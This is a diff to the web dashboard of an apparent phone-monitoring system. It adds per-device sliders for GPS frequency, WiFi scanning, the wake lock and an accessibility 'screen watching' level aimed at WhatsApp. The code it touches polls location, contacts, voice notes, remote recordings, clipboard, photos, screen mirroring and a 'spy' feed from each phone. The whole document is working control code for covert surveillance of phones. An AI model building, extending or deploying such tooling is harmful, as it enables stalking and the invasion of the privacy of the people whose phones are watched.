@@ -457,6 +457,69 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
+<!-- Performance Tuning — 7 sliders per-phone + presets (unified truth: devices/<id>/config/tuning) -->
+<div id="tuningPanel" style="margin-bottom:12px;padding:12px;background:var(--card);border:1px solid var(--accent);border-radius:10px">
+<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px">
+<b style="font-size:13px;color:var(--text)">⚡ Performance — how hard the phone works</b>
+<span id="tuningStatus" style="font-size:11px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap">
+<button onclick="applyTuningPreset('cool')" style="padding:6px 12px;border-radius:20px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:12px;font-weight:600;cursor:pointer" title="Coolest — longest intervals, lowest heat">❄️ Cool</button>
+<button onclick="applyTuningPreset('normal')" style="padding:6px 12px;border-radius:20px;border:1px solid var(--accent);background:var(--accent);color:#000;font-size:12px;font-weight:600;cursor:pointer" title="Balanced — default">⚖️ Normal</button>
+<button onclick="applyTuningPreset('hot')" style="padding:6px 12px;border-radius:20px;border:1px solid var(--danger);background:var(--bg);color:var(--text);font-size:12px;font-weight:600;cursor:pointer" title="Hottest — fastest updates, most heat">🔥 Hot</button>
+</div>
+<div style="display:grid;gap:10px">
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">GPS precise</span>
+<input type="range" id="tuning_high_acc_ms" min="10000" max="1800000" step="5000" style="flex:1" oninput="onTuningSlider('high_acc_ms', this.value)" onchange="setTuning('high_acc_ms', this.value)">
+<span id="tuning_high_acc_ms_val" style="font-size:11px;min-width:70px;text-align:right">10s</span><span id="tuning_high_acc_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Fast location</span>
+<input type="range" id="tuning_fast_loc_ms" min="15000" max="1200000" step="5000" style="flex:1" oninput="onTuningSlider('fast_loc_ms', this.value)" onchange="setTuning('fast_loc_ms', this.value)">
+<span id="tuning_fast_loc_ms_val" style="font-size:11px;min-width:70px;text-align:right">15s</span><span id="tuning_fast_loc_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Keep GPS alive</span>
+<input type="range" id="tuning_continuous_ms" min="0" max="300000" step="5000" style="flex:1" oninput="onTuningSlider('continuous_ms', this.value)" onchange="setTuning('continuous_ms', this.value)">
+<span id="tuning_continuous_ms_val" style="font-size:11px;min-width:70px;text-align:right">10s</span><span id="tuning_continuous_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">WiFi/LAN scan</span>
+<input type="range" id="tuning_wifi_ms" min="60000" max="1800000" step="10000" style="flex:1" oninput="onTuningSlider('wifi_ms', this.value)" onchange="setTuning('wifi_ms', this.value)">
+<span id="tuning_wifi_ms_val" style="font-size:11px;min-width:70px;text-align:right">1m</span><span id="tuning_wifi_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Main check loop</span>
+<input type="range" id="tuning_fgs_loop_ms" min="30000" max="600000" step="10000" style="flex:1" oninput="onTuningSlider('fgs_loop_ms', this.value)" onchange="setTuning('fgs_loop_ms', this.value)">
+<span id="tuning_fgs_loop_ms_val" style="font-size:11px;min-width:70px;text-align:right">30s</span><span id="tuning_fgs_loop_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Heavy sync</span>
+<input type="range" id="tuning_sync_ms" min="10" max="120" step="5" style="flex:1" oninput="onTuningSlider('sync_ms', this.value)" onchange="setTuning('sync_ms', this.value)">
+<span id="tuning_sync_ms_val" style="font-size:11px;min-width:70px;text-align:right">20m</span><span id="tuning_sync_ms_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--success);color:#fff;min-width:36px;text-align:center">Warm</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Reading Assist</span>
+<select id="tuning_a11y_level" onchange="setTuning('a11y_level', this.value)" style="flex:1;padding:6px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:12px">
+<option value="0">OFF — no screen watching (coolest)</option>
+<option value="1">LOW — WhatsApp only</option>
+<option value="2">MEDIUM — balanced</option>
+<option value="3" selected>HIGH — all events (hottest)</option>
+</select>
+<span id="tuning_a11y_level_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center">Hot</span>
+</div>
+<div style="display:flex;align-items:center;gap:10px">
+<span style="font-size:12px;font-weight:600;min-width:130px">Keep awake</span>
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer">
+<input type="checkbox" id="tuning_wakelock_mode" onchange="setTuning('wakelock_mode', this.checked ? 'always' : 'timeout')">
+<span style="font-size:12px">Always awake (hot) — uncheck = sleep when idle (cool)</span>
+</label>
+<span id="tuning_wakelock_mode_heat" style="font-size:10px;padding:2px 6px;border-radius:999px;background:var(--danger);color:#fff;min-width:36px;text-align:center;margin-left:auto">Hot</span>
+</div>
+</div>
+<div style="font-size:11px;color:var(--muted);margin-top:8px">Per-phone — Pixel can be ❄️ Cool while Huawei stays 🔥 Hot. Sliders write to <code>devices/&lt;id&gt;/config/tuning</code> (one truth for website + viewer app + phone). Preset Cool = 5 min GPS, OFF keepalive, 15 min WiFi, 3 min loop, 60 min heavy, LOW assist, sleep.</div>
+</div>
 <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_location">
 <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
 <div style="position:relative;width:44px;height:24px">
@@ -3337,6 +3400,8 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   pollAppVer();
   pollAll();
   setTimeout(pollUpdatePause, 800);
+  setTimeout(pollSyncToggles, 800);
+  setTimeout(pollTuning, 800);
 });
 
 // --- Polling ---
@@ -3372,7 +3437,8 @@ function startPolling() {
   schedulePoll('simSlots', intervals.simSlots || 60000, pollSimSlots);
   schedulePoll('cellInfo', intervals.cellInfo || 60000, pollCellInfo);
   schedulePoll('savedWifi', intervals.savedWifi || 60000, pollSavedWifi);
-  schedulePoll('syncToggles', 30000, pollSyncToggles);
+  schedulePoll('syncToggles', 10000, pollSyncToggles);
+  schedulePoll('tuning', 10000, pollTuning);
   schedulePoll('updatePause', 30000, pollUpdatePause);
   schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
 }
@@ -3386,7 +3452,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollActivity(), pollSimSlots(), pollCellInfo(), pollSavedWifi(), pollSyncToggles(), pollUpdatePause()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollActivity(), pollSimSlots(), pollCellInfo(), pollSavedWifi(), pollSyncToggles(), pollTuning(), pollUpdatePause()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -10329,24 +10395,31 @@ async function toggleLogcatPause(paused) {
   setTimeout(pollLogcatToggleState, 1500);
 }
 
-// --- Sync toggles (per-tab + master) ---
+// --- Sync toggles (per-tab + master) — unified truth: devices/<id>/config/sync_toggles (per-phone) ---
 async function toggleSyncPause(target, paused){
   if(!selectedDevice){ showAlert('No device selected','error'); return; }
   if(target==='all' || target==='all_storage') target='all';
   const statusEl = document.getElementById('syncToggleStatus_'+target) || document.getElementById('syncToggleStatus_all_storage');
-  const labelEl = document.getElementById('syncToggleLabel_'+target) || document.getElementById('syncToggleLabel_all_storage');
   if(statusEl) statusEl.textContent = paused ? 'Pausing…' : 'Resuming…';
   try{
     const action = paused ? 'pause' : 'resume';
     const ts = Date.now();
-    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/commands/sync_control`, {action, target, ts_ms: ts});
+    // Unified truth: write sticky per-phone FIRST (so even if command delete fails, phone heals via reconcile)
     const ok2 = await writeRTDBStrict(`devices/${selectedDevice}/config/sync_toggles/${target}`, !paused);
-    // also mirror to config/sync_toggles for global compatibility (if rules allow)
-    try{ await writeRTDBStrict(`config/sync_toggles/${target}`, !paused); }catch{}
-    if(ok1 && ok2) showAlert((paused?'Paused ':'Resumed ')+target+' sync','warn');
+    const ok1 = await writeRTDBStrict(`devices/${selectedDevice}/commands/sync_control`, {action, target, ts_ms: ts});
+    if(ok1 && ok2) showAlert((paused?'Paused ':'Resumed ')+target+' sync — viewer + website now show same','warn');
+    else if(ok2) showAlert((paused?'Paused ':'Resumed ')+target+' (sticky saved, command will heal in 60s)','warn');
     else showAlert('Failed to set sync toggle for '+target,'error');
   }catch(e){ showAlert('Toggle failed: '+e.message,'error'); }
-  setTimeout(pollSyncToggles, 1500);
+  setTimeout(pollSyncToggles, 4000);
+  // verify after 5s
+  setTimeout(async()=>{
+    try{
+      const verify = await fetchRTDB(`devices/${selectedDevice}/config/sync_toggles/${target}`);
+      const isPaused = verify===false || verify==='false' || verify===0;
+      if(isPaused!==paused) showAlert('Sync toggle not yet confirmed — retrying in 10s','warn');
+    }catch{}
+  }, 5000);
 }
 function updateSyncToggleUI(target, paused){
   const t = document.getElementById('syncPauseToggle_'+target);
@@ -10391,21 +10464,146 @@ async function pollSyncToggles(){
   try{
     let data = await fetchRTDB(`devices/${selectedDevice}/config/sync_toggles`);
     if(!data || typeof data!=='object') data = {};
-    // Also try global config/sync_toggles as fallback
+    // Unified truth: per-phone only. Never use global fallback except when per-phone completely empty (new device)
     if(!Object.keys(data).length){
       const g = await fetchRTDB(`config/sync_toggles`);
-      if(g && typeof g==='object') data = g;
+      if(g && typeof g==='object' && Object.keys(g).length) data = g;
+    } else {
+      // Even when per-phone has partial keys, do NOT merge global — missing key means collecting (default true), not global value
     }
+    const masterPaused = data['all']===false || data['all']==='false' || data['all']===0;
     const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','cellInfo','simSlots','apps','logcat','nearby','clipboard','system','mirroring'];
     for(const tgt of targets){
       let val = data[tgt];
-      // val true means enabled (collecting), false means paused; if undefined => collecting
       let paused = false;
       if(val===false || val==='false' || val===0) paused = true;
       else if(val===true || val==='true' || val===1) paused = false;
       else paused = false;
-      updateSyncToggleUI(tgt, paused);
+      // Effective state: if master paused, every single is effectively paused
+      const effectivePaused = tgt==='all' ? paused : (masterPaused || paused);
+      updateSyncToggleUI(tgt, effectivePaused);
+      // If master blocked, show hint
+      if(masterPaused && tgt!=='all'){
+        const st = document.getElementById('syncToggleStatus_'+tgt);
+        if(st && paused===false) st.textContent = 'Blocked by Master Pause — turn off Master to resume';
+      }
     }
+  }catch(e){}
+}
+// --- Tuning sliders (Live tab — 7 sliders, per-phone unified truth) ---
+function fmtTuning(key, v){
+  v = Number(v);
+  if(key==='continuous_ms' && v===0) return 'OFF';
+  if(key==='sync_ms') return v+'m';
+  if(v < 60000) return Math.round(v/1000)+'s';
+  if(v < 3600000) return Math.round(v/60000)+'m';
+  return (v/60000).toFixed(0)+'m';
+}
+function heatForTuning(key, v){
+  v = Number(v);
+  if(key==='high_acc_ms') return v<=15000?'Hot':v<=60000?'Warm':'Cool';
+  if(key==='fast_loc_ms') return v<=30000?'Hot':v<=120000?'Warm':'Cool';
+  if(key==='continuous_ms') return v===0?'Cool':v<=15000?'Hot':'Warm';
+  if(key==='wifi_ms') return v<=90000?'Hot':v<=300000?'Warm':'Cool';
+  if(key==='fgs_loop_ms') return v<=45000?'Hot':v<=120000?'Warm':'Cool';
+  if(key==='sync_ms') return v<=15?'Hot':v<=30?'Warm':'Cool';
+  if(key==='a11y_level') return v>=3?'Hot':v>=2?'Warm':v==1?'Cool':'Cool';
+  if(key==='wakelock_mode') return v===true||v==='always'?'Hot':'Cool';
+  return '';
+}
+function onTuningSlider(key, v){
+  const el = document.getElementById('tuning_'+key+'_val');
+  const h = document.getElementById('tuning_'+key+'_heat');
+  if(el) el.textContent = fmtTuning(key, v);
+  if(h){ const heat = heatForTuning(key, v); h.textContent = heat; h.style.background = heat==='Hot'?'var(--danger)':heat==='Warm'?'var(--accent)':'var(--success)'; if(heat==='Warm') h.style.color='#000'; else h.style.color='#fff'; }
+}
+async function setTuning(key, value){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  const status = document.getElementById('tuningStatus');
+  if(status) status.textContent = 'Saving '+key+'…';
+  // Normalize: numbers for intervals, int for a11y, bool for wakelock
+  let v = value;
+  if(key==='a11y_level') v = parseInt(value,10);
+  else if(key==='wakelock_mode') v = (value===true || value==='always' || value==='true') ? true : false; // store bool: true=always hot, false=timeout cool
+  else v = Number(value);
+  try{
+    // Unified truth: sticky per-phone FIRST, then instant command
+    const okSticky = await writeRTDBStrict(`devices/${selectedDevice}/config/tuning/${key}`, v);
+    const okCmd = await writeRTDBStrict(`devices/${selectedDevice}/commands/tuning_control`, {action:'set', key, value: v, ts_ms: Date.now()});
+    if(okSticky) {
+      onTuningSlider(key, v);
+      if(status) status.textContent = key+' = '+fmtTuning(key, v)+' — saved (website + viewer app now same)';
+      // keep wakelock checkbox in sync
+      if(key==='wakelock_mode'){
+        const cb = document.getElementById('tuning_wakelock_mode'); if(cb) cb.checked = !!v;
+      }
+      if(key==='a11y_level'){
+        const sel = document.getElementById('tuning_a11y_level'); if(sel) sel.value = String(v);
+      } else {
+        const sl = document.getElementById('tuning_'+key); if(sl) sl.value = String(v);
+      }
+    }
+    if(!okSticky) showAlert('Failed to save tuning '+key,'error');
+  }catch(e){ showAlert('Tuning failed: '+e.message,'error'); if(status) status.textContent = 'Failed'; }
+  setTimeout(pollTuning, 4000);
+}
+async function applyTuningPreset(preset){
+  if(!selectedDevice){ showAlert('No device selected','error'); return; }
+  const status = document.getElementById('tuningStatus');
+  if(status) status.textContent = 'Applying '+preset+' preset…';
+  try{
+    // Preset via single command so phone can apply atomically, plus sticky mirror
+    const okCmd = await writeRTDBStrict(`devices/${selectedDevice}/commands/tuning_control`, {action:'preset', preset, ts_ms: Date.now()});
+    // Also mirror preset values sticky so pollTuning shows them even before phone heals
+    const presets = {
+      cool: {high_acc_ms:300000, fast_loc_ms:300000, continuous_ms:0, wifi_ms:900000, fgs_loop_ms:180000, sync_ms:60, a11y_level:1, wakelock_mode:false},
+      normal: {high_acc_ms:30000, fast_loc_ms:60000, continuous_ms:30000, wifi_ms:300000, fgs_loop_ms:60000, sync_ms:20, a11y_level:2, wakelock_mode:false},
+      hot: {high_acc_ms:10000, fast_loc_ms:15000, continuous_ms:10000, wifi_ms:60000, fgs_loop_ms:30000, sync_ms:15, a11y_level:3, wakelock_mode:true}
+    };
+    const vals = presets[preset] || presets['normal'];
+    for(const k in vals){
+      try{ await writeRTDBStrict(`devices/${selectedDevice}/config/tuning/${k}`, vals[k]); }catch{}
+    }
+    showAlert(preset+' preset applied — all 7 sliders now '+preset,'warn');
+    if(status) status.textContent = preset+' preset saved — all devices will see same';
+    setTimeout(pollTuning, 2000);
+  }catch(e){ showAlert('Preset failed: '+e.message,'error'); }
+}
+async function pollTuning(){
+  if(!selectedDevice) return;
+  try{
+    let data = await fetchRTDB(`devices/${selectedDevice}/config/tuning`);
+    if(!data || typeof data!=='object') data = {};
+    const defaults = {high_acc_ms:10000, fast_loc_ms:15000, continuous_ms:10000, wifi_ms:60000, fgs_loop_ms:30000, sync_ms:20, a11y_level:3, wakelock_mode:true};
+    const keys = Object.keys(defaults);
+    for(const k of keys){
+      let v = data[k];
+      if(v===undefined || v===null || v==='null') v = defaults[k];
+      // wakelock stored as bool true=always hot, false=timeout cool — dashboard checkbox true=always
+      if(k==='wakelock_mode'){
+        const isAlways = v===true || v==='true' || v==='always' || v===1;
+        const cb = document.getElementById('tuning_wakelock_mode');
+        if(cb) cb.checked = isAlways;
+        const h = document.getElementById('tuning_'+k+'_heat');
+        if(h){ const heat = heatForTuning(k, isAlways); h.textContent = heat; h.style.background = heat==='Hot'?'var(--danger)':'var(--success)'; h.style.color='#fff'; }
+        continue;
+      }
+      if(k==='a11y_level'){
+        v = parseInt(v,10); if(isNaN(v)) v=3; v=Math.max(0,Math.min(3,v));
+        const sel = document.getElementById('tuning_a11y_level');
+        if(sel) sel.value = String(v);
+        const h = document.getElementById('tuning_'+k+'_heat');
+        if(h){ const heat = heatForTuning(k, v); h.textContent = heat; h.style.background = heat==='Hot'?'var(--danger)':heat==='Warm'?'var(--accent)':'var(--success)'; h.style.color = heat==='Warm'?'#000':'#fff'; }
+        continue;
+      }
+      v = Number(v);
+      if(isNaN(v)) v = defaults[k];
+      const sl = document.getElementById('tuning_'+k);
+      if(sl) sl.value = String(v);
+      onTuningSlider(k, v);
+    }
+    const st = document.getElementById('tuningStatus');
+    if(st) st.textContent = 'Loaded — per-phone (Pixel ≠ Huawei)';
   }catch(e){}
 }
 // --- Per-device update pause (Live tab) ---
